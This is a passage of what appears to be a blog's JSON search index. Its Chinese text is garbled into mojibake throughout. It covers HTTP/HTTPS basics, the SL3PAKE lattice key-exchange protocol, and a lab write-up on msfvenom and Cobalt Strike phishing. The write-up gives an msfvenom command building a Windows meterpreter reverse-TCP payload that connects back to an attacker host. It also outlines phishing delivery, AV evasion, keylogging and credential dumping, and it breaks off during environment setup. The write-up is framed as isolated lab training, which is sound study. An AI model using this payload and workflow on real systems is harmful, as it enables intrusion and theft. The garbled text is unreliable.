åè®®çš„ç®€å•ç‰¹æ€§ï¼Œä¸”ä¸ä¿å­˜å®¢æˆ·ç«¯çš„çŠ¶æ€ï¼Œä¸è¿›è¡ŒéªŒè¯å®¢æˆ·ç«¯æ˜¯å¦æ˜¯çœŸå®å­˜åœ¨ï¼Œä¼ è¾“ä½¿ç”¨çš„æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œæ•…ä¹Ÿå¾ˆå…·æœ‰ç¼ºç‚¹ã€‚ é€šä¿¡åŒæ–¹ä½¿ç”¨æ˜æ–‡ä¼ è¾“ï¼ˆä¸åŠ å¯†ï¼‰ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬ ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½ï¼Œå› æ­¤å¯èƒ½é­é‡ä¼ªè£… æ— æ³•è¯æ˜æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼Œæ‰€ä»¥æœ‰å¯èƒ½å·²é­ç¯¡æ”¹ã€‚ HTTPS HTTPSç®€ä»‹ï¼šHTTPSæ˜¯åœ¨HTTPä¸Šå»ºç«‹SSLåŠ å¯†å±‚ï¼Œå¹¶å¯¹ä¼ è¾“æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œæ˜¯HTTPåè®®çš„å®‰å…¨ç‰ˆã€‚é»˜è®¤HTTPçš„ç«¯å£å·ä¸º80ï¼ŒHTTPSçš„ç«¯å£å·ä¸º443ã€‚ ä¸»è¦ä½œç”¨ï¼š å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å»ºç«‹ä¸€ä¸ªä¿¡æ¯å®‰å…¨é€šé“ï¼Œæ¥ä¿è¯ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ•°æ®å®‰å…¨ å¯¹ç½‘ç«™æœåŠ¡å™¨è¿›è¡ŒçœŸå®èº«ä»½è®¤è¯ ä¸HTTPçš„æœ¬è´¨åŒºåˆ«ï¼šæ˜æ–‡ä¼ è¾“ä¸åŠ å¯†ä¼ è¾“ é‡‡ç”¨HTTPSåè®®çš„æœåŠ¡å™¨ï¼ˆServerï¼‰å¿…é¡»ä»å…¬ä¿¡æœºæ„ï¼ˆCAï¼‰ç”³è¯·ä¸€ä¸ªç”¨äºè¯æ˜æœåŠ¡å™¨ç”¨é€”ç±»å‹çš„è¯ä¹¦ã€‚è¯¥è¯ä¹¦åªæœ‰ç”¨äºå¯¹åº”çš„Serverçš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯ï¼ˆClientï¼‰æ‰ä¿¡ä»»è¯¥ä¸»æœº ","date":"2026-01-12T14:08:04+08:00","permalink":"http://localhost:1313/p/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/","title":"Webå®‰å…¨åŸºç¡€"},{"content":"SL3PAKEåè®® ç›®å½• å‚è€ƒæ–‡çŒ® åŸºç¡€ä¿¡æ¯ å›°éš¾æ€§åŸºç¡€ ä¸‰æ–¹å‚ä¸ ç¬¦å·è¡¨ åè®®æµç¨‹ Server Sï¼šåˆå§‹åŒ–è®¾ç½® Client Aï¼šå®ä¾‹åŒ–ä¼šè¯ Client A =\u0026gt; Client B Client Bï¼šå®ä¾‹åŒ–ä¼šè¯ Client B =\u0026gt; Server S Server Sï¼šå®¢æˆ·ç«¯èº«ä»½è®¤è¯ å¯¹ Client A çš„èº«ä»½è®¤è¯ å¯¹ Client B çš„èº«ä»½è®¤è¯ Server Sï¼šååŠ© Client A å’Œ Client B å»ºç«‹åå•†å¯†é’¥ å¯¹äº Client A ï¼š å¯¹äº Client Bï¼š Server S =\u0026gt; Client B Client Bï¼šéªŒè¯ S èº«ä»½å¹¶ä¸ A åå•†å¯†é’¥ éªŒè¯ Server S çš„èº«ä»½ ä¸ Client A å®Œæˆåå•† Client B =\u0026gt; Client A Client Aï¼šéªŒè¯ S èº«ä»½å¹¶ä¸ B åå•†å¯†é’¥ éªŒè¯ Server S çš„èº«ä»½ ä¸ Client B å®Œæˆåå•† å®Œæˆå¯†é’¥åå•† å‚è€ƒæ–‡çŒ® å¼•ç”¨æ ¼å¼ï¼ˆIEEEï¼‰ï¼š\n[1] V. Dabra, S. Kumari, A. Bala, and S. Yadav, â€œSL3PAKE: Simple Lattice-based Three-party Password Authenticated Key Exchange for post-quantum world,â€ Journal of Information Security and Applications, vol. 84, p. 103826, Aug. 2024, doi: 10.1016/j.jisa.2024.103826.\nç½‘å€ï¼šåŸæ–‡é“¾æ¥\né™„ä»¶ï¼šSL3PAKE: Simple Lattice-based Three-party Password Authenticated Key Exchange for post-quantum world\nåŸºç¡€ä¿¡æ¯ å›°éš¾æ€§åŸºç¡€ â€‹\tSL3PAKEçš„å›°éš¾æ€§å»ºç«‹åœ¨ RLW é—®é¢˜çš„è®¡ç®—å›°éš¾æ€§ä¸Šï¼ŒRLWEé—®é¢˜å¯ä»¥å½’çº¦åˆ°æ ¼ä¸­çš„æœ€çŸ­å‘é‡é—®é¢˜ï¼ˆSVPï¼‰æˆ–æœ€è¿‘å‘é‡é—®é¢˜ï¼ˆCVPï¼‰\nä¸‰æ–¹å‚ä¸ Server(S)ï¼šSL3PAKEæœåŠ¡å™¨ ClientA(A)ï¼šå¯†é’¥äº¤æ¢å®¢æˆ·ç«¯A ClientB(B)ï¼šå¯†é’¥äº¤æ¢å®¢æˆ·ç«¯B ç¬¦å·è¡¨ $n$ï¼šæ»¡è¶³ $n=2k$ çš„æ­£æ•´æ•°ï¼ˆå®‰å…¨å‚æ•°ï¼‰ï¼Œå…¶ä¸­ $k$ ä¸ºä»»æ„æ­£æ•°\n$q$ï¼šæ»¡è¶³ $q\\equiv 1 \\ (mod\\ 2n)$ çš„å¤§å¥‡ç´ æ•°\n$R$ï¼š$\\displaystyle{\\frac{\\mathbb{Z}\\left[x\\right]}{\\langle f(x)\\rangle} = \\frac{\\mathbb{Z}\\left[x\\right]}{\\langle x^n+1 \\rangle}}$ï¼ˆå¤šé¡¹å¼å•†ç¯ï¼Œå…¶ä¸­ $f(x)$ ä¸ºåˆ†åœ†å¤šé¡¹å¼ï¼‰\n$R_q$ï¼š$\\displaystyle{\\frac{R}{qR}}$\n$\\chi_\\beta$ï¼š$R_q$ ä¸Šçš„æ ‡å‡†å·®ä¸º $\\beta$ çš„ç¦»æ•£é«˜æ–¯åˆ†å¸ƒ\n$e\\leftarrow \\chi_\\beta$ï¼šæ¥è‡ª $\\chi_\\beta$ ä¸­çš„éšæœºæ ·æœ¬\n$a\\in_{ru}R_q$ ï¼šä» $R_q$ ä¸­çš„éšæœºå‡åŒ€çš„é€‰å–æ ·æœ¬\n$x_S,s_S$ï¼šSçš„å…¬é’¥ä¸ç§é’¥\n$x_A,s_A$ï¼šAçš„å…¬é’¥ä¸ç§é’¥\n$x_B,s_B$ï¼šBçš„å…¬é’¥ä¸ç§é’¥\n$P,Q$ï¼šå°†å­—ç¬¦ä¸² $P$ å’Œ $Q$ ä¸²è”æ‹¼æ¥åˆå¹¶\n$E$ï¼šè¿‘0é›†åˆï¼Œ\n$$\\displaystyle{E=\\left\\{ -\\left\\lfloor \\frac{q}{4} \\right\\rfloor \\cdots \\left\\lfloor \\frac{q}{4} \\right\\rceil \\right\\}}$$ $\\operatorname{Cha}(m)$ï¼šç‰¹å¾å‡½æ•°ï¼Œ $$ \\operatorname{Cha}(m) = \\begin{cases} 0, \\quad if\\ m\\in E \\\\ 1, else\\\\ \\end{cases}\\\\ $$ $\\operatorname{Mod_2}(m,n)$ï¼šæ ¡éªŒå‡½æ•°ï¼Œ $$ \\operatorname{Mod_2}(m,n) = \\left(m+n\\cdot\\frac{q-1}{2} \\right)\\ \\ mod\\ q \\ \\ mod\\ 2 $$ $\\operatorname{h_0}(\\cdot)$ï¼šå“ˆå¸Œå‡½æ•°ï¼Œ$\\operatorname{h_0}: \\lbrace 0,1 \\rbrace ^* \\rightarrow R_q$\n$\\operatorname{h_1}(\\cdot)$ï¼šå“ˆå¸Œå‡½æ•°ï¼Œ$\\operatorname{h_0}: \\lbrace 0,1 \\rbrace^* \\rightarrow \\lbrace 0,1\\rbrace^g$\n$\\operatorname{h_2}(\\cdot)$ï¼šå“ˆå¸Œå‡½æ•°ï¼Œ$\\operatorname{h_0}:\\lbrace 0,1\\rbrace^* \\rightarrow \\chi_\\beta$\n$pw_A,pw_B$ï¼šAå’ŒBçš„å£ä»¤å¯†ç \n$ID_S,ID_A,ID_B$ï¼šSã€Aå’ŒBçš„å”¯ä¸€èº«ä»½æ ‡è¯†\nåè®®æµç¨‹ Server Sï¼šåˆå§‹åŒ–è®¾ç½® Sé€‰æ‹©å®‰å…¨å‚æ•° $n$ ä¸å¥‡ç´ æ•° $q$ Sé€‰æ‹©ç¦»æ•£é«˜æ–¯åˆ†å¸ƒ $\\chi_\\beta$ ä»¥åŠ $a\\in_{ru}R_q$ Sè®¡ç®—æœåŠ¡å™¨å…¬é’¥ $x_S = a\\cdot s_S + 2e_S$ï¼Œå…¶ä¸­ $ s_S,e_S\\leftarrow \\chi_\\beta$ Sé€‰å–å“ˆå¸Œå‡½æ•° $\\operatorname{h_0}(\\cdot)$ã€$\\operatorname{h_1}(\\cdot)$ã€$\\operatorname{h_2}(\\cdot)$ Sé€šè¿‡å®‰å…¨ä¿¡é“æ¥å—Aå’ŒBçš„å£ä»¤çš„å“ˆå¸Œå€¼ $\\operatorname{h_0}(pw_A)$ å’Œ $\\operatorname{h_0}(pw_B)$ Sç”Ÿæˆå¹¶å…¬å¼€Sã€Aã€Bçš„èº«ä»½æ ‡è¯† $ID_S$ã€$ID_A$ã€$ID_B$ Sä¿å­˜å‚æ•°ï¼š$\\lbrace s_S,\\operatorname{h_0}(pw_A),\\operatorname{h_0}(pw_B) \\rbrace$ Så…¬å¼€å‚æ•°ï¼š$\\lbrace n,q,\\chi_\\beta,a,x_S,ID_A,ID_B,ID_S,\\operatorname{h_0}(\\cdot),\\operatorname{h_1}(\\cdot),\\operatorname{h_2}(\\cdot) \\rbrace$ Client Aï¼šå®ä¾‹åŒ–ä¼šè¯ Inputï¼š$ID_A$ ï¼Œ $pw_A$ $x_A = a\\cdot s_A + 2e_A$ï¼Œå…¶ä¸­ $s_A,e_A\\leftarrow \\chi_\\beta$ $x_A^* = x_A + \\operatorname{h_0}(pw_A)$ $h_{AS} = \\operatorname{h_1}(ID_A,ID_S,x_A,x^*_A)$ Client A =\u0026gt; Client B $ A \\Rightarrow B: \\lbrace ID_A,x_A^*,h_{AS} \\rbrace $ Client Bï¼šå®ä¾‹åŒ–ä¼šè¯ Inputï¼š$ID_B$ ï¼Œ $pw_B$ $x_B = a\\cdot s_B + 2e_B$ï¼Œå…¶ä¸­ $s_B,e_B\\leftarrow \\chi_\\beta$ $x^*_B = x_B + \\operatorname{h_0}(pw_B)$ $h_{BS} = \\operatorname{h_1}(ID_B,ID_S,x_B,x^*_B)$ Client B =\u0026gt; Server S $ B \\Rightarrow S: \\lbrace ID_A,ID_B,x_A^*,x_B^*,h_{AS},h_{BS} \\rbrace $ Server Sï¼šå®¢æˆ·ç«¯èº«ä»½è®¤è¯ å¯¹ Client A çš„èº«ä»½è®¤è¯ $x_A' = x^*_A - \\operatorname{h_0}(pw_A)$ï¼Œè¿™é‡Œæœ‰ $x_A == x_A'$ Check if $h_{AS} \\overset{?}{==} \\operatorname{h_1}(ID_A,ID_S,x_A',x^*_A)$ If not, then abort. å¯¹ Client B çš„èº«ä»½è®¤è¯ $x_B' = x^*_B - \\operatorname{h_0}(pw_B)$ï¼Œè¿™é‡Œæœ‰ $x_B == x_B'$ Check if $h_{BS} \\overset{?}{==} \\operatorname{h_1}(ID_B,ID_S,x_B',x^*_B)$ If not, then abort. Server Sï¼šååŠ© Client A å’Œ Client B å»ºç«‹åå•†å¯†é’¥ $x_S = a\\cdot s_S +2e_S $ï¼Œå…¶ä¸­ $ s_S,e_S\\leftarrow \\chi_\\beta$ å¯¹äº Client A ï¼š $c_A = x_B' \\cdot s_S + 2f_{S_4}$ï¼Œå…¶ä¸­ $f_{S_4} \\leftarrow \\chi_\\beta$ $m = \\operatorname{h_2}(ID_S,ID_A,x_S,x_A')$ $k_{SA}=(x_A'\\cdot s_S+2m)\\cdot m+2f_{S_1}$ï¼Œå…¶ä¸­ $f_{S_1} \\leftarrow \\chi_\\beta$ $\\omega_{SA} = \\operatorname{Cha}(k_{SA})$ $\\sigma_{SA} = \\operatorname{Mod_2}(k_{SA},\\omega_{SA})$ $\\alpha_{SA}=\\operatorname{h_1}(ID_A,ID_B,ID_S,c_A,x_A',\\sigma_{SA})$ å¯¹äº Client Bï¼š $c_B = x_A'\\cdot s_S + 2f_{S_5}$ï¼Œå…¶ä¸­ $f_{S_5} \\leftarrow \\chi_\\beta$ $n = \\operatorname{h_2}(ID_S,ID_B,x_S,x_B')$ $k_{SB}=(x_B'\\cdot s_S+2n)\\cdot n+2f_{S_3}$ï¼Œå…¶ä¸­ $f_{S_3} \\leftarrow \\chi_\\beta$ $\\omega_{SB} = \\operatorname{Cha}(k_{SB})$ $\\sigma_{SB} = \\operatorname{Mod_2}(k_{SB},\\omega_{SB})$ $\\alpha_{SB}=\\operatorname{h_1}(ID_A,ID_B,ID_S,c_B,x_B',\\sigma_{SB})$ Server S =\u0026gt; Client B $S\\Rightarrow B: \\lbrace c_A,c_B,x_S,\\omega_{SA},\\omega_{SB},\\alpha_{SA},\\alpha_{SB}\\rbrace$ Client Bï¼šéªŒè¯ S èº«ä»½å¹¶ä¸ A åå•†å¯†é’¥ éªŒè¯ Server S çš„èº«ä»½ $n = \\operatorname{h_2}(ID_S,ID_B,x_S,x_B)$ $k_{BS}=(x_S\\cdot s_B+2n)\\cdot n+2f_{B_1}$ï¼Œå…¶ä¸­ $f_{B_1} \\leftarrow \\chi_\\beta$ $\\sigma_{BS} = \\operatorname{Mod_2}(k_{BS},\\omega_{SB})$ $\\alpha_{BS}=\\operatorname{h_1}(ID_A,ID_B,ID_S,c_B,x_B,\\sigma_{BS})$ Check if $\\alpha_{BS} \\overset{?}{==} \\alpha_{SB}$ If not, then abort. ä¸ Client A å®Œæˆåå•† $\\nu_{BA} = c_B\\cdot s_B +2f_{B_2}$ï¼Œå…¶ä¸­ $f_{B_2} \\leftarrow \\chi_\\beta$ $\\omega_{BA}=\\operatorname{Cha}(\\nu_{BA})$ $\\sigma_{BA}=\\operatorname{Mod_2}(\\nu_{BA},\\omega_{BA})$ $ sk_{BA} = \\operatorname{h_1}(ID_A,ID_B,ID_S,x_A^*,x_B^*,\\sigma_{BA})$ Client B =\u0026gt; Client A $B\\Rightarrow A: \\lbrace ID_B,x_B^*,c_A,x_S,\\omega_{BA},\\omega_{SA},\\alpha_{SA}\\rbrace$ Client Aï¼šéªŒè¯ S èº«ä»½å¹¶ä¸ B åå•†å¯†é’¥ éªŒè¯ Server S çš„èº«ä»½ $m = \\operatorname{h_2}(ID_S,ID_A,x_S,x_A)$ $k_{AS}=(x_S\\cdot s_A+2m)\\cdot m+2f_{A_1}$ï¼Œå…¶ä¸­ $f_{A_1} \\leftarrow \\chi_\\beta$ $\\sigma_{AS} = \\operatorname{Mod_2}(k_{AS},\\omega_{SA})$ $\\alpha_{AS}=\\operatorname{h_1}(ID_A,ID_B,ID_S,c_A,x_A,\\sigma_{AS})$ Check if $\\alpha_{AS} \\overset{?}{==} \\alpha_{SA}$ If not, then abort. ä¸ Client B å®Œæˆåå•† $\\nu_{AB} = c_A\\cdot s_A +2f_{A_2}$ï¼Œå…¶ä¸­ $f_{A_2} \\leftarrow \\chi_\\beta$ $\\sigma_{AB}=\\operatorname{Mod_2}(\\nu_{AB},\\omega_{BA})$ $sk_{AB} = \\operatorname{h_1}(ID_A,ID_B,ID_S,x_A^*,x_B^*,\\sigma_{AB})$ å®Œæˆå¯†é’¥åå•† åå•†å¯†é’¥ï¼š$sk_{BA} == sk_{AB}$ ","date":"2026-01-07T13:01:39+08:00","image":"http://localhost:1313/p/%E6%A0%BC%E5%9F%BA%E5%8A%A0%E5%AF%86sl3pake%E5%8D%8F%E8%AE%AE/cover_hu_3de43e1b37429c38.png","permalink":"http://localhost:1313/p/%E6%A0%BC%E5%9F%BA%E5%8A%A0%E5%AF%86sl3pake%E5%8D%8F%E8%AE%AE/","title":"ã€æ ¼åŸºåŠ å¯†ã€‘SL3PAKEåè®®"},{"content":"MSFæ¶æ„ç¨‹åºåˆ©ç”¨ä¸CSé’“é±¼ç½‘ç«™åˆ¶ä½œ ç›®å½• å®è·µæ¦‚è§ˆ MSFVenom Cobalt Strike ç¯å¢ƒé…ç½® å®è·µæ­¥éª¤ MFSæ¶æ„ç¨‹åºåˆ©ç”¨ ä½¿ç”¨msfvenomåˆ¶ä½œæ¶æ„è½¯ä»¶ åˆ¶ä½œç›‘å¬ç¨‹åº å°†æ¶æ„ç¨‹åºä¼ è¾“ä¸‹è½½åˆ°é¶æœº ç­‰å¾…é¶æœºæ‰§è¡Œæ¶æ„ç¨‹åº CSé’“é±¼ç½‘ç«™åˆ¶ä½œ Cobalt Strikeå®‰è£… æ›´æ”¹CSè¯»å†™æƒé™ ç”ŸæˆCobalt StrikeæœåŠ¡å™¨ç»„ æ‰“å¼€Cobalt Strikeå®¢æˆ·ç«¯å¹¶è¿æ¥æœåŠ¡å™¨ç»„ åˆ›å»ºç›‘å¬å™¨ ç½‘ç«™å…‹éš†ä¸Webæ—¥å¿— é¶æœºè®¿é—®é’“é±¼ç½‘ç«™ é”®ç›˜è®°å½• CSèœå•åŠŸèƒ½æ¦‚è§ˆ è§†å›¾ æ”»å‡» å®è·µæ¦‚è§ˆ åç§°ï¼šMSFæ¶æ„ç¨‹åºåˆ©ç”¨ä¸CSä¸Šçº¿ ç›®çš„ï¼šä½¿ç”¨MSFVenomæ¶æ„è½¯ä»¶è·å–shellï¼›ä½¿ç”¨Cobalt Strikeåˆ¶ä½œé’“é±¼ç½‘ç«™å¹¶ç›‘å¬é”®ç›˜ æ—¶é—´ï¼š2026å¹´1æœˆ3æ—¥ é£é™©è¯´æ˜ï¼šæœ¬å®éªŒåœ¨å®Œå…¨éš”ç¦»çš„è™šæ‹ŸåŒ–å®éªŒå®¤ç¯å¢ƒä¸‹è¿›è¡Œï¼Œä»…ç”¨äºæ•™è‚²æˆ–æˆæƒæµ‹è¯• MSFVenom å®šä¹‰ï¼š msfvenom æ˜¯ Metasploit Framework çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ æ”»å‡»è½½è·ç”Ÿæˆå™¨ã€‚å®ƒå–ä»£äº†æ—§ç‰ˆçš„ msfpayload å’Œ msfencode å·¥å…·ï¼Œç”¨äºåˆ›å»ºå’Œç¼–ç å„ç§æ ¼å¼çš„ shellcode æˆ–å¯æ‰§è¡Œæ–‡ä»¶ã€‚\nä¸»è¦åŠŸèƒ½ï¼š\nç”Ÿæˆè½½è·ï¼š å¯ä»¥ç”Ÿæˆé€‚ç”¨äºå‡ ä¹æ‰€æœ‰æ“ä½œç³»ç»Ÿï¼ˆWindows, Linux, macOS, Androidç­‰ï¼‰å’Œæ¶æ„ï¼ˆx86, x64, ARMç­‰ï¼‰çš„æ”»å‡»è½½è·ã€‚ å¤šç§æ ¼å¼ï¼š è¾“å‡ºæ ¼å¼å¤šæ ·ï¼Œå¦‚å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ.exe, .elfï¼‰ã€åŠ¨æ€é“¾æ¥åº“ï¼ˆ.dllï¼‰ã€Webè„šæœ¬ï¼ˆ.php, .aspxï¼‰ã€Shellä»£ç ï¼ˆCã€Pythonã€Rubyç­‰æ ¼å¼çš„åŸå§‹å­—èŠ‚ï¼‰ç­‰ã€‚ ç¼–ç ä¸è§„é¿ï¼š å†…ç½®å¤šç§ç¼–ç å™¨ï¼ˆå¦‚ x86/shikata_ga_naiï¼‰ï¼Œå¯ä»¥å¯¹ç”Ÿæˆçš„è½½è·è¿›è¡Œæ··æ·†ï¼Œä»¥ç»•è¿‡åŸºç¡€çš„é™æ€æ€æ¯’è½¯ä»¶ï¼ˆAVï¼‰æ£€æµ‹ã€‚ æ†ç»‘ï¼š å¯ä»¥å°†æ”»å‡»è½½è·ä¸ä¸€ä¸ªæ­£å¸¸çš„åˆæ³•ç¨‹åºï¼ˆå¦‚è®¡ç®—å™¨ã€PDFé˜…è¯»å™¨ï¼‰æ†ç»‘åœ¨ä¸€èµ·ï¼Œè¯±éª—ç›®æ ‡è¿è¡Œã€‚ è½¬æ¢æ ¼å¼ï¼š å¯ä»¥å°†è½½è·åœ¨ä¸åŒæ ¼å¼ä¹‹é—´è½¬æ¢ã€‚ å…¸å‹å·¥ä½œæµç¨‹ï¼š\nçº¢é˜Ÿäººå‘˜å†³å®šæ”»å‡»ç›®æ ‡ï¼ˆä¾‹å¦‚ï¼šWindows 10 x64ï¼‰ã€‚\nä½¿ç”¨ msfvenom å‘½ä»¤ç”Ÿæˆä¸€ä¸ªåå‘ TCP è¿æ¥çš„ Windows åé—¨ï¼š\n1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=æ”»å‡»æœº LPORT=4444 -f exe -o payload.exe é€šè¿‡ç¤¾ä¼šå·¥ç¨‹å­¦ï¼ˆå¦‚é’“é±¼é‚®ä»¶ï¼‰å°† payload.exe æŠ•é€’åˆ°ç›®æ ‡æœºå™¨ã€‚\nç›®æ ‡è¿è¡Œåï¼Œä¼šåœ¨å…¶æœºå™¨ä¸Šå»ºç«‹ä¸€ä¸ªä¸æ”»å‡»è€… Metasploit ç›‘å¬å™¨ï¼ˆmulti/handlerï¼‰çš„è¿æ¥ã€‚\næ”»å‡»è€…è·å¾—ä¸€ä¸ª Meterpreter shellï¼Œå¯ä»¥è¿›è¡ŒåŸºæœ¬çš„åæœŸåˆ©ç”¨ã€‚\nç‰¹ç‚¹ï¼š\nå…è´¹ä¸”å¼€æºã€‚ åŠŸèƒ½å•ä¸€ä½†å¼ºå¤§ï¼Œä¸“æ³¨äºè½½è·ç”Ÿæˆã€‚ é€šå¸¸éœ€è¦ä¸ Metasploit Framework çš„å…¶ä»–æ¨¡å—ï¼ˆå¦‚ç›‘å¬å™¨ã€åˆ©ç”¨æ¨¡å—ï¼‰é…åˆä½¿ç”¨ã€‚ åœ¨ç»•è¿‡ç°ä»£EDR/AVæ–¹é¢èƒ½åŠ›æœ‰é™ï¼Œç”Ÿæˆçš„è½½è·å®¹æ˜“è¢«é«˜çº§å®‰å…¨è½¯ä»¶æ£€æµ‹ã€‚ Cobalt Strike å®šä¹‰ï¼š Cobalt Strike æ˜¯ä¸€ä¸ª å•†ä¸šçš„ã€ç»¼åˆæ€§çš„çº¢é˜Ÿå’Œå¯¹æ‰‹æ¨¡æ‹Ÿå¹³å°ã€‚å®ƒè¿œä¸æ­¢ä¸€ä¸ªè½½è·ç”Ÿæˆå™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªé›†æˆäº† æŒ‡æŒ¥ä¸æ§åˆ¶ã€é’“é±¼æ”»å‡»ã€æ¨ªå‘ç§»åŠ¨ã€æƒé™æå‡ã€æŠ¥å‘Šç”Ÿæˆ ç­‰åŠŸèƒ½çš„å®Œæ•´ä½œæˆ˜ç³»ç»Ÿã€‚\nä¸»è¦åŠŸèƒ½ï¼š\né«˜çº§æ”»å‡»è½½è·ï¼š Beaconï¼š Cobalt Strike çš„æ ¸å¿ƒè½½è·ï¼Œæ˜¯ä¸€ä¸ªé«˜åº¦å¯å®šåˆ¶çš„ã€éšè”½çš„â€œå¿ƒè·³â€ä»£ç†ã€‚æ”¯æŒå¤šç§é€šä¿¡åè®®ï¼ˆHTTP/HTTPS, DNS, SMBï¼‰å’Œå›è°ƒæ–¹å¼ã€‚ ç”Ÿæˆç»è¿‡é«˜åº¦æ··æ·†ã€ç­¾åã€æˆ–åˆ©ç”¨å„ç§æŠ€æœ¯ï¼ˆå¦‚è¿›ç¨‹æ³¨å…¥ã€æ¨¡å—åå°„å¼åŠ è½½ï¼‰çš„ Beacon è½½è·ï¼Œä»¥ç»•è¿‡æ€æ¯’è½¯ä»¶å’Œç»ˆç«¯æ£€æµ‹ä¸å“åº”ï¼ˆEDRï¼‰ã€‚ å›¾å½¢åŒ–æŒ‡æŒ¥ä¸æ§åˆ¶ï¼š æ‰€æœ‰ä¸Šçº¿çš„è¢«æ§ä¸»æœºï¼ˆBeaconï¼‰éƒ½åœ¨ä¸€ä¸ªç›´è§‚çš„å›¾å½¢ç•Œé¢ä¸­æ˜¾ç¤ºï¼Œå¯ä»¥åˆ†ç»„ã€æ‰“æ ‡ç­¾ã€‚ é€šè¿‡å³é”®èœå•æˆ–å‘½ä»¤ï¼Œè½»æ¾å‘ä»»ä½• Beacon å‘é€æŒ‡ä»¤ï¼ˆæ–‡ä»¶æ“ä½œã€æˆªå›¾ã€é”®ç›˜è®°å½•ã€ææƒç­‰ï¼‰ã€‚ å†…ç½‘æ¨ªå‘ç§»åŠ¨ï¼š ç«¯å£æ‰«æå’ŒæœåŠ¡å‘ç°ã€‚ å‡­æ®è½¬å‚¨ï¼ˆä»å†…å­˜ä¸­æå–å¯†ç å“ˆå¸Œå’Œç¥¨æ®ï¼‰ã€‚ å“ˆå¸Œä¼ é€’ã€ç¥¨æ®ä¼ é€’ æ”»å‡»ã€‚ SMB Beacon ç”¨äºç©¿é€æ²¡æœ‰ç›´æ¥å¤–ç½‘è¿æ¥çš„å†…éƒ¨ç½‘ç»œèŠ‚ç‚¹ã€‚ é±¼å‰å¼ç½‘ç»œé’“é±¼ï¼š å†…ç½®æ¨¡æ¿å’ŒæœåŠ¡å™¨ï¼Œå¯ä»¥æ–¹ä¾¿åœ°åˆ›å»ºå’Œç®¡ç†é’“é±¼é‚®ä»¶æ´»åŠ¨ï¼Œè¿½è¸ªç‚¹å‡»å’Œè½½è·æ‰§è¡Œæƒ…å†µã€‚ Malleable C2 é…ç½®æ–‡ä»¶ï¼š è¿™æ˜¯ Cobalt Strike çš„çµé­‚åŠŸèƒ½ã€‚å…è®¸æ“ä½œå‘˜ å®Œå…¨è‡ªå®šä¹‰ Beacon çš„é€šä¿¡æ¨¡å¼ï¼ˆå¦‚æ¨¡æ‹Ÿæˆ Googleã€CloudFlare ç­‰åˆæ³•æœåŠ¡çš„æµé‡ï¼‰ï¼Œæå¤§åœ°å¢å¼ºäº†éšè”½æ€§å’Œå¯¹æŠ—ç½‘ç»œæµé‡åˆ†æçš„èƒ½åŠ›ã€‚ å›¢é˜Ÿåä½œï¼š æ”¯æŒå¤šä¸ªæ“ä½œå‘˜åŒæ—¶è¿æ¥åˆ°ä¸€ä¸ªå›¢é˜ŸæœåŠ¡å™¨ï¼ŒååŒå·¥ä½œã€‚ æŠ¥å‘Šä¸æ—¥å¿—ï¼š è‡ªåŠ¨è®°å½•æ‰€æœ‰æ“ä½œï¼Œä¾¿äºç”Ÿæˆæœ€ç»ˆçš„æ”»å‡»æŠ¥å‘Šã€‚ å…¸å‹å·¥ä½œæµç¨‹ï¼š\nçº¢é˜Ÿå¯åŠ¨ Cobalt Strike å›¢é˜ŸæœåŠ¡å™¨ã€‚ æ“ä½œå‘˜ä½¿ç”¨ Cobalt Strike å®¢æˆ·ç«¯ è¿æ¥ã€‚ ä½¿ç”¨ â€œæ”»å‡»â€-\u0026gt;â€œç”ŸæˆPayloadâ€ åˆ›å»ºä¸€ä¸ªé«˜åº¦å®šåˆ¶çš„ Beaconï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ Malleable C2 é…ç½®æ–‡ä»¶æ¨¡æ‹Ÿæ­£å¸¸æµé‡ï¼‰ã€‚ é€šè¿‡ é±¼å‰å¼é’“é±¼ æˆ–åˆ©ç”¨å…¶ä»–æ¼æ´æŠ•é€’ Beaconã€‚ ç›®æ ‡ä¸Šçº¿åï¼Œåœ¨å¯è§†åŒ–åœ°å›¾ä¸Šçœ‹åˆ°æ–°ä¸»æœºã€‚ æ“ä½œå‘˜é€šè¿‡ Beacon è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œåˆ©ç”¨å†…ç½®å·¥å…·è¿›è¡Œå‡­æ®è½¬å‚¨ï¼Œç„¶ååœ¨å†…ç½‘æ¨ªå‘ç§»åŠ¨ï¼Œé€æ­¥æ§åˆ¶æ›´å¤šå…³é”®èµ„äº§ã€‚ ç‰¹ç‚¹ï¼š\nå•†ä¸šè½¯ä»¶ï¼Œä»·æ ¼æ˜‚è´µï¼Œä½†åŠŸèƒ½æå…¶å¼ºå¤§ã€‚ é«˜åº¦é›†æˆåŒ–å’Œè‡ªåŠ¨åŒ–ï¼Œå°†çº¢é˜Ÿè¡ŒåŠ¨çš„å„ä¸ªé˜¶æ®µæ— ç¼è¡”æ¥ã€‚ ä»¥éšåŒ¿å’Œå¯¹æŠ—ç°ä»£å®‰å…¨é˜²å¾¡ä¸ºæ ¸å¿ƒè®¾è®¡ã€‚ æ˜¯ é«˜çº§æŒç»­æ€§å¨èƒï¼ˆAPTï¼‰æ¨¡æ‹Ÿ å’Œ æˆç†Ÿçº¢é˜Ÿ çš„é¦–é€‰å·¥å…·ã€‚ ç¯å¢ƒé…ç½® è™šæ‹Ÿç¯å¢ƒï¼šVMware Workstation 17 Pro - 17.0.0 build-20800274 é¶æœºï¼š ç³»ç»Ÿï¼šWindows 7 Enterprise x64 CPUï¼š11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz) ç½‘ç»œï¼šLANï¼ˆIPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULLï¼‰ æ”»å‡»æœºï¼š ç³»ç»Ÿï¼šLinux kali 6.12.25-amd64 CPUï¼š11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 